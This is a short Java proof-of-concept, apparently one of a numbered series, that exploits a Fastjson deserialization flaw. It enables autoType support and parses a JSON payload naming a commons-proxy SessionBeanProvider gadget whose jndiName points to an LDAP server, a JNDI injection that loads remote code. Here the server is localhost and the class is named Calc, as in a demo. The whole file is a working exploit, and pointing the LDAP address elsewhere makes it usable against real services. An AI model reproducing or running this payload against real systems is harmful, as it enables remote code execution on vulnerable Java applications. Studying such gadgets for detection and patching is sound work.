import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

public class FastjsonBypass7 {
    public static void main(String[] args) {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String payload = "{\"@type\":\"org.apache.commons.proxy.provider.remoting.SessionBeanProvider\",\"jndiName\":\"ldap://localhost:1389/Calc\"}";
        JSON.parse(payload);
    }
}
